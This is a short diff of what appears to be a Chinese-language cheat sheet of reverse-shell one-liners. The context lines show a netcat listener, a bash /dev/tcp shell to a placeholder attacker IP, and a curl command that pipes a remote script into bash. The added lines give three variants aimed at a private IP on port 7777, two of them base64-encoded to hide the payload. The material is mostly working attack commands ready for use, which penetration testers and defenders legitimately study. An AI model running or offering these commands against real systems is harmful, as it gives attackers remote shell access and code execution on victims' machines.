@@ -27,6 +27,9 @@ nc -lvp 7777
 
 # 被攻击机 , 不要在zsh
 /bin/bash -i >& /dev/tcp/攻击机ip/7777 0>&1
+bash -c '/bin/bash -i >& /dev/tcp/192.168.50.161/7777 0>&1'
+bash -c 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTAuMTYxLzc3NzcgMD4mMQ==|base64 -d|bash -i'
+echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTAuMTYxLzc3NzcgMD4mMQ==|base64 -d|bash
 curl http://攻击机ip:2126/sa.sh|bash
 
 ## curl: shell.txt,内容为bash -i >& /dev/tcp/攻击机ip/7777 0>&1
